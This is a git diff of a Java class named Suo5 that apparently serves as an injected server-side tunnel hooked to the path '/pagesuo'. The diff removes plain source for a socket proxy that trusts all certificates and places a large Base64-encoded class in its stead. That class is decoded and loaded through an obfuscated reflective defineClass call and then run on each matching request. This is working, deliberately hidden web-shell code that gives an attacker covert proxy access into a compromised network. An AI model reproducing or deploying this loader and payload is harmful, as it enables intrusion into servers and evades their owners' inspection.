@@ -1,555 +1,83 @@
 package com.sf.sl;
 
-import com.sf.redefine.MyRequest;
-import com.sf.redefine.MyResponse;
 
-import javax.net.ssl.*;
-import java.io.*;
-import java.net.*;
-import java.nio.ByteBuffer;
-import java.security.cert.CertificateException;
-import java.security.cert.X509Certificate;
-import java.util.Date;
-import java.util.Enumeration;
-import java.util.HashMap;
 
-public class Suo5 implements Runnable, HostnameVerifier, X509TrustManager {
-    static HashMap addrs = collectAddr();
-    private static final String pathPattern = "/pagesuo";
+public class Suo5 {
+    private static final String pathPattern= "/pagesuo";
 
-    InputStream gInStream;
-    OutputStream gOutStream;
-
-    public Suo5() {
+    public static Class loader(byte[] bytes) throws Exception {
+        java.net.URLClassLoader classLoader = new java.net.URLClassLoader(new java.net.URL[0], Thread.currentThread().getContextClassLoader());
+        java.lang.reflect.Method method = ClassLoader.class.getDeclaredMethod(new String(new byte[]{100,101,102,105,110,101,67,108,97,115,115}), new Class[]{byte[].class, int.class, int.class});
+        method.setAccessible(true);
+        Class clazz = (Class) method.invoke(classLoader, new Object[]{bytes, new Integer(0), new Integer(bytes.length)});
+        return clazz;
     }
-
-    public Suo5(InputStream in, OutputStream out) {
-        this.gInStream = in;
-        this.gOutStream = out;
-    }
-
 
     public static void doService(Object obj, String url, String method, java.io.InputStream in) {
         if (url.matches(pathPattern)) {
             java.util.Map objMap = (java.util.Map) obj;
             Object request = objMap.get("request");
             Object response = objMap.get("response");
+
+            Object[] args = new Object[]{
+                    request,
+                    response
+            };
+
             try {
-                process(request,response,in);
+                java.net.URLClassLoader loader = new java.net.URLClassLoader(new java.net.URL[0], Thread.currentThread().getContextClassLoader());
+                String clazzBase64 = "yv66vgAAADECGgoABgD4CQBqAPkJAGoA+gcA+wgA/AcA/QgA/goAagD/BwEACAEBCAECCgAJAQMKAGoBBAgBBQoAagEGCgBqAQcHAQgHAQkKABIBCgcBCwoAFAD4CgAUAQwKAB0BDQoAHQEOBQAAAAAAAADICgBsAQ8IARAHAREKAGoBEggBEwcBFAoAIAEVCgAgARYHARcKACMA+AgBGAoAIwEZCAEaCAEbBwEcBwEdCgAqAPgKACoBHggBHwoAKgEgCgAqASEKACkBIgoBIwEkBwElCgAyAPgKACMBJgsBJwEoCgAjASkHASoKAAkBKwoAMgEsCgAJAS0KADIBFQoAagEuCgAyAS8KATABMQoBMAEyCgEwATMKATABNAoBMAE1BwE2CgBDATcKAEMBOAoBMAE5CgEwAToKATABOwMCAAAABwE8CAE9CgBKASIIAT4KABIBIgoAagE/CgAJAUAIAUEKAGoBQggBQwcBRAoAVAE3CgBqAUUIAUYKAJwBRwgBSAgBSQgBSggBSwgBTAgBTQoAnAFOBwFPCgBgAPgHAVAKAGIBUQoAYAFSCgBqAVMKAGoBVAoAIAFVCgBgAVYKAGABVwcBWAoAagFZBwFaCgBsAVsKAGwBXAoAagFdCgBgAVUKAGwBXgoAHQFfCgBqAWAIAWEIAWIIAWMKACMBZAoAagFlCgBqAWYKAJcBZwgBaAoABgFpCAFqBwFrCgB+AWwKAW0BbgoAagFvCgCXAVcIAXAIAXEKAGoBcgoAiQFzCwCrAXQLAKsBdQcBdgoAiQF3BwF4CgCLAXkKAAkBegoACQF7CQF8AX0HAX4KAJABIgoAkAF/CQBqAYAKACMBgQgBggoAkAGDBwGECgCXAYUIAYYJAJwBhwoAfgGIBwGJCgCcAYoIAYsKAJcBjAoAlwGNBwGOCgB+AY8KAKEBkAgBkQoBkgGTBwGUCgGSAZUKAZIBlgoAoQGXCAGYBwGZCgCXAZoKAJcBVgoAlwGbBwGcCgB+AZ0HAZ4JALEBhwcBnwkAswGHCgBqAaAKAW0BoQoBbQGiCgBqAaMHAaQHAaUHAaYBAAVhZGRycwEAE0xqYXZhL3V0aWwvSGFzaE1hcDsBAAlnSW5TdHJlYW0BABVMamF2YS9pby9JbnB1dFN0cmVhbTsBAApnT3V0U3RyZWFtAQAWTGphdmEvaW8vT3V0cHV0U3RyZWFtOwEABjxpbml0PgEALihMamF2YS9pby9JbnB1dFN0cmVhbTtMamF2YS9pby9PdXRwdXRTdHJlYW07KVYBAARDb2RlAQADKClWAQAGZXF1YWxzAQAVKExqYXZhL2xhbmcvT2JqZWN0OylaAQAacmVhZElucHV0U3RyZWFtV2l0aFRpbWVvdXQBABsoTGphdmEvaW8vSW5wdXRTdHJlYW07W0JJKVYBAApFeGNlcHRpb25zBwGnAQANdHJ5RnVsbER1cGxleAEAJyhMamF2YS9sYW5nL09iamVjdDtMamF2YS9sYW5nL09iamVjdDspVgEACW5ld0NyZWF0ZQEAFihCKUxqYXZhL3V0aWwvSGFzaE1hcDsBAAduZXdEYXRhAQAXKFtCKUxqYXZhL3V0aWwvSGFzaE1hcDsBAAZuZXdEZWwBABUoKUxqYXZhL3V0aWwvSGFzaE1hcDsBAAluZXdTdGF0dXMBAAp1MzJ0b0J5dGVzAQAFKEkpW0IBAApieXRlc1RvVTMyAQAFKFtCKUkBAAtjb3B5T2ZSYW5nZQEACChbQklJKVtCAQAHbWFyc2hhbAEAFyhMamF2YS91dGlsL0hhc2hNYXA7KVtCAQAJdW5tYXJzaGFsAQAqKExqYXZhL2lvL0lucHV0U3RyZWFtOylMamF2YS91dGlsL0hhc2hNYXA7AQAOcHJvY2Vzc0RhdGFCaW8BAApyZWFkU29ja2V0AQAvKExqYXZhL2lvL0lucHV0U3RyZWFtO0xqYXZhL2lvL091dHB1dFN0cmVhbTtaKVYBAAdyZWFkUmVxAQA2KExqYXZhL2lvL0J1ZmZlcmVkSW5wdXRTdHJlYW07TGphdmEvaW8vT3V0cHV0U3RyZWFtOylWAQAQcHJvY2Vzc0RhdGFVbmFyeQEAA3J1bgEAC2NvbGxlY3RBZGRyAQALaXNMb2NhbEFkZHIBABUoTGphdmEvbGFuZy9TdHJpbmc7KVoBAAhyZWRpcmVjdAEAVShMamF2YS9sYW5nL09iamVjdDtMamF2YS91dGlsL0hhc2hNYXA7TGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL25ldC9IdHRwVVJMQ29ubmVjdGlvbjsBAAZ2ZXJpZnkBAC8oTGphdmEvbGFuZy9TdHJpbmc7TGphdmF4L25ldC9zc2wvU1NMU2Vzc2lvbjspWgEAEmNoZWNrQ2xpZW50VHJ1c3RlZAEAOihbTGphdmEvc2VjdXJpdHkvY2VydC9YNTA5Q2VydGlmaWNhdGU7TGphdmEvbGFuZy9TdHJpbmc7KVYHAagBABJjaGVja1NlcnZlclRydXN0ZWQBABJnZXRBY2NlcHRlZElzc3VlcnMBACcoKVtMamF2YS9zZWN1cml0eS9jZXJ0L1g1MDlDZXJ0aWZpY2F0ZTsBAAxpbnZva2VNZXRob2QBAEsoTGphdmEvbGFuZy9PYmplY3Q7TGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBAA1pbnZva2VNZXRob2QyAQBdKExqYXZhL2xhbmcvT2JqZWN0O0xqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL0NsYXNzO1tMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQAIPGNsaW5pdD4MAMIAxQwAvgC/DADAAMEBABNbTGphdmEvbGFuZy9PYmplY3Q7AQAJZ2V0SGVhZGVyAQAQamF2YS9sYW5nL09iamVjdAEAClVzZXItQWdlbnQMAPMA9AEAEGphdmEvbGFuZy9TdHJpbmcBAAxDb250ZW50LVR5cGUBABFhcHBsaWNhdGlvbi9wbGFpbgwAxgDHDADMAM0BABhhcHBsaWNhdGlvbi9vY3RldC1zdHJlYW0MAN8AzQwA5ADNAQATamF2YS9sYW5nL1Rocm93YWJsZQEAE2phdmEvbGFuZy9FeGNlcHRpb24MAakAxQEADmphdmEvdXRpbC9EYXRlDAGqAasMAawBrQwBrgGvDAGwAbEBAA5nZXRJbnB1dFN0cmVhbQEAE2phdmEvaW8vSW5wdXRTdHJlYW0MAMgAyQEAD2dldE91dHB1dFN0cmVhbQEAFGphdmEvaW8vT3V0cHV0U3RyZWFtDAGyAbMMAbQAxQEAEWphdmEvdXRpbC9IYXNoTWFwAQACYWMMAbUBtgEAAXMBAAJkdAEAImphdmEvbGFuZy9JbGxlZ2FsQXJndW1lbnRFeGNlcHRpb24BABdqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcgwBtwG4AQADID4gDAG3AbkMAboBuwwAwgG8BwG9DAG+Ab8BAB1qYXZhL2lvL0J5dGVBcnJheU91dHB1dFN0cmVhbQwBwAHBBwHCDAHDAcQMAcUBxgEAAltCDAHHAa0MAbIByAwByQHKDADVANYMAcsBygcBzAwBzQHODAHPAc4MAbUB0AwBtQHRDAHSAcoBABdqYXZhL2lvL0RhdGFJbnB1dFN0cmVhbQwAwgHTDAHUAbMMAdUB0QwB1gGtDAHFAdcBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQALaW52YWxpZCBsZW4BAA1rZXkgbGVuIGVycm9yDADZANoMAMIBswEAD3ZhbHVlIGxlbiBlcnJvcgwA1wDYAQALdmFsdWUgZXJyb3IBABtqYXZhL2lvL0J1ZmZlcmVkSW5wdXRTdHJlYW0MAN0A3gEACXNldFN0YXR1cwwB2AHZAQANc2V0QnVmZmVyU2l6ZQEACXNldEhlYWRlcgEAEVgtQWNjZWwtQnVmZmVyaW5nAQACbm8BAAFoAQABcAwB2gHbAQAPamF2YS9uZXQvU29ja2V0AQAaamF2YS9uZXQvSW5ldFNvY2tldEFkZHJlc3MMAMIB3AwB3QHeDADUAM8MANsA3AwB3wDFDAETAeAMARAB4QEACnZzdW9zeXN0ZW0MAMIAwwEAEGphdmEvbGFuZy9UaHJlYWQMAMIB4gwB4wDFDADiAOMMAeQAxQwBrgDYDADQANEBAAJpZAEAAXIBAAAMAeUBxgwA5wDoDADpAOoMAeYAxQEAEWdldFNlcnZsZXRDb250ZXh0DAHnAegBAAxnZXRBdHRyaWJ1dGUBAA9qYXZhL2xhbmcvQ2xhc3MMAekB6gcB6wwB7AHtDADSANMBAAxzZXRBdHRyaWJ1dGUBAA9yZW1vdmVBdHRyaWJ1dGUMAOAA4QwB7gHvDAHwAfEMAfIB8wEAGWphdmEvbmV0L05ldHdvcmtJbnRlcmZhY2UMAfQB7wEAFGphdmEvbmV0L0luZXRBZGRyZXNzDAH1AbsMAfYB9wwB+AH5BwH6DAH7AfwBAAxqYXZhL25ldC9VUkwMAf0BuwwAvAC9DAH+AMcBAAlnZXRNZXRob2QMAf8CAAEAGmphdmEvbmV0L0h0dHBVUkxDb25uZWN0aW9uDAIBAbwBABFzZXRDb25uZWN0VGltZW91dAwCAgIDDAGCAeoBABFqYXZhL2xhbmcvSW50ZWdlcgwAwgHIAQAOc2V0UmVhZFRpbWVvdXQMAgQCBQwCBgIFAQAgamF2YXgvbmV0L3NzbC9IdHRwc1VSTENvbm5lY3Rpb24MAgcAxwwCCAIJAQADU1NMBwIKDAILAgwBABpqYXZheC9uZXQvc3NsL1RydXN0TWFuYWdlcgwCDQIODAIPAhAMAhECEgEADmdldEhlYWRlck5hbWVzAQAVamF2YS91dGlsL0VudW1lcmF0aW9uDAITAhQMAhUBrQEAImphdmEvc2VjdXJpdHkvY2VydC9YNTA5Q2VydGlmaWNhdGUMAhYCFwEADmphdmEvbGFuZy9Mb25nAQAPamF2YS9sYW5nL1Nob3J0DAD1APYMAhgB8QwCGQIFDADmANMBABJqYXZhL2xhbmcvUnVubmFibGUBAB5qYXZheC9uZXQvc3NsL0hvc3RuYW1lVmVyaWZpZXIBAB5qYXZheC9uZXQvc3NsL1g1MDlUcnVzdE1hbmFnZXIBAB5qYXZhL2xhbmcvSW50ZXJydXB0ZWRFeGNlcHRpb24BACdqYXZhL3NlY3VyaXR5L2NlcnQvQ2VydGlmaWNhdGVFeGNlcHRpb24BAA9wcmludFN0YWNrVHJhY2UBAAdnZXRUaW1lAQADKClKAQAJYXZhaWxhYmxlAQADKClJAQAEcmVhZAEAByhbQklJKUkBAAVzbGVlcAEABChKKVYBAAV3cml0ZQEABShbQilWAQAFZmx1c2gBAANwdXQBADgoTGphdmEvbGFuZy9PYmplY3Q7TGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEABmFwcGVuZAEAHChJKUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAAh0b1N0cmluZwEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQAOamF2YS9sYW5nL01hdGgBAANtaW4BAAUoSUkpSQEABmtleVNldAEAESgpTGphdmEvdXRpbC9TZXQ7AQANamF2YS91dGlsL1NldAEAB3RvQXJyYXkBABUoKVtMamF2YS9sYW5nL09iamVjdDsBAANnZXQBACYoTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEABmxlbmd0aAEABChJKVYBAAhnZXRCeXRlcwEABCgpW0IBAAt0b0J5dGVBcnJheQEAE2phdmEvbmlvL0J5dGVCdWZmZXIBAAhhbGxvY2F0ZQEAGChJKUxqYXZhL25pby9CeXRlQnVmZmVyOwEABnB1dEludAEAGChCKUxqYXZhL25pby9CeXRlQnVmZmVyOwEAGShbQilMamF2YS9uaW8vQnl0ZUJ1ZmZlcjsBAAVhcnJheQEAGChMamF2YS9pby9JbnB1dFN0cmVhbTspVgEACXJlYWRGdWxseQEABHdyYXABAAZnZXRJbnQBAAMoKUIBAAd2YWx1ZU9mAQAWKEkpTGphdmEvbGFuZy9JbnRlZ2VyOwEACHBhcnNlSW50AQAVKExqYXZhL2xhbmcvU3RyaW5nOylJAQAWKExqYXZhL2xhbmcvU3RyaW5nO0kpVgEAB2Nvbm5lY3QBABwoTGphdmEvbmV0L1NvY2tldEFkZHJlc3M7SSlWAQAFY2xvc2UBABgoKUxqYXZhL2lvL091dHB1dFN0cmVhbTsBABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwEAFyhMamF2YS9sYW5nL1J1bm5hYmxlOylWAQAFc3RhcnQBAARqb2luAQAGcmVtb3ZlAQAKZGlzY29ubmVjdAEACGdldENsYXNzAQATKClMamF2YS9sYW5nL0NsYXNzOwEAEWdldERlY2xhcmVkTWV0aG9kAQBAKExqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL0NsYXNzOylMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEAGGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZAEABmludm9rZQEAOShMamF2YS9sYW5nL09iamVjdDtbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEAFGdldE5ldHdvcmtJbnRlcmZhY2VzAQAZKClMamF2YS91dGlsL0VudW1lcmF0aW9uOwEAD2hhc01vcmVFbGVtZW50cwEAAygpWgEAC25leHRFbGVtZW50AQAUKClMamF2YS9sYW5nL09iamVjdDsBABBnZXRJbmV0QWRkcmVzc2VzAQAOZ2V0SG9zdEFkZHJlc3MBAAdpbmRleE9mAQAEKEkpSQEACXN1YnN0cmluZwEAFihJSSlMamF2YS9sYW5nL1N0cmluZzsBABFqYXZhL2xhbmcvQm9vbGVhbgEABFRSVUUBABNMamF2YS9sYW5nL0Jvb2xlYW47AQAHZ2V0SG9zdAEAC2NvbnRhaW5zS2V5AQAOb3BlbkNvbm5lY3Rpb24BABooKUxqYXZhL25ldC9VUkxDb25uZWN0aW9uOwEAEHNldFJlcXVlc3RNZXRob2QBAARUWVBFAQARTGphdmEvbGFuZy9DbGFzczsBAAtzZXREb091dHB1dAEABChaKVYBAApzZXREb0lucHV0AQAKaXNJbnN0YW5jZQEAE3NldEhvc3RuYW1lVmVyaWZpZXIBACMoTGphdmF4L25ldC9zc2wvSG9zdG5hbWVWZXJpZmllcjspVgEAGGphdmF4L25ldC9zc2wvU1NMQ29udGV4dAEAC2dldEluc3RhbmNlAQAuKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YXgvbmV0L3NzbC9TU0xDb250ZXh0OwEABGluaXQBAFcoW0xqYXZheC9uZXQvc3NsL0tleU1hbmFnZXI7W0xqYXZheC9uZXQvc3NsL1RydXN0TWFuYWdlcjtMamF2YS9zZWN1cml0eS9TZWN1cmVSYW5kb207KVYBABBnZXRTb2NrZXRGYWN0b3J5AQAiKClMamF2YXgvbmV0L3NzbC9TU0xTb2NrZXRGYWN0b3J5OwEAE3NldFNTTFNvY2tldEZhY3RvcnkBACMoTGphdmF4L25ldC9zc2wvU1NMU29ja2V0RmFjdG9yeTspVgEAEnNldFJlcXVlc3RQcm9wZXJ0eQEAJyhMamF2YS9sYW5nL1N0cmluZztMamF2YS9sYW5nL1N0cmluZzspVgEAD2dldFJlc3BvbnNlQ29kZQEAEGlzQXNzaWduYWJsZUZyb20BABQoTGphdmEvbGFuZy9DbGFzczspWgEADGlzQWNjZXNzaWJsZQEADXNldEFjY2Vzc2libGUAIQBqAAYAAwC5ALoAuwADAAgAvAC9AAAAAAC+AL8AAAAAAMAAwQAAAB0AAQDCAMMAAQDEAAAAGwACAAMAAAAPKrcAASortQACKiy1AAOxAAAAAAABAMIAxQABAMQAAAARAAEAAQAAAAUqtwABsQAAAAAAAQDGAMcAAQDEAAAAswAGAAgAAAB/K8AA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";
+                byte[] clazzByte;
+                try {
+                    Class Base64 = loader.loadClass("sun.misc.BASE64Decoder");
+                    Object Decoder = Base64.newInstance();
+                    clazzByte=(byte[]) Decoder.getClass().getMethod("decodeBuffer", new Class[]{String.class}).invoke(Decoder, new Object[]{(clazzBase64)});
+                } catch (Throwable ex)
+                {
+                    Class Base64 = loader.loadClass("java.util.Base64");
+                    Object Decoder = Base64.getDeclaredMethod("getDecoder",new Class[0]).invoke(null, new Object[0]);
+                    clazzByte=(byte[])Decoder.getClass().getMethod("decode", new Class[]{String.class}).invoke(Decoder, new Object[]{clazzBase64});
+                }
+
+                Class clazz = loader(clazzByte);
+                clazz.newInstance().equals(args);
             } catch (Exception e) {
                 e.printStackTrace();
             }
         }
     }
 
-    public static void process(Object request, Object response, java.io.InputStream in) {
-        String agent = null;
-        String contentType = null;
-        try {
-            agent = MyRequest.getHeader(request,"User-Agent");
-            contentType = MyRequest.getHeader(request,"Content-Type");
-        } catch (Exception e) {
-            e.printStackTrace();
-        }
-
-//        if (agent == null || !agent.equals("Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.1.2.3")) {
-//            return;
+//    public static void main(String[] args) {
+//        String classname = "vsuosystem.class";
+//        byte[] code = new byte[0];
+//        try {
+//            code = java.nio.file.Files.readAllBytes(java.nio.file.Paths.get("/Users/joker/IdeaProjects/veo/vagent/src/main/java/com/sf/classs/"+classname));
+//            System.out.println(java.util.Arrays.toString(code));
+//            String b64bytecode = new String(org.apache.tomcat.util.codec.binary.Base64.encodeBase64(code));
+//            String result = java.net.URLEncoder.encode(b64bytecode, "UTF-8");
+//            System.out.println(result);
+//        } catch (Exception e) {
+//            e.printStackTrace();
 //        }
-//        if (contentType == null) {
-//            return;
-//        }
-
-        try {
-            System.out.println(contentType);
-            if (contentType.equals("application/plain")) {
-                tryFullDuplex(request, response,in);
-                return;
-            }
-            processDataUnary(request, response,in);
-//            if (contentType.equals("application/x-binary")) {
